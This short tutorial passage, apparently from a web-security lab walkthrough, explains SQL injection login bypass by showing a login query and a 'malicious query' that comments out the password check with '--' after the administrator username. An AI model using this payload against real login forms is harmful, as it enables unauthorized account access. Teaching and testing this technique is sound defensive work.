The query used by the database:

```sql
SELECT username, password FROM users WHERE username = 'administrator' AND password = 'bla-bla-bla'
```

Do you know the admin's password? I don't! Let's do a little trick. 

**Modify the  database query with a comment symbol**

The malicious query:

```sql
SELECT username, password FROM users WHERE username = 'administrator'--
```

The rest of the query will not be evaluated as it was commented out.
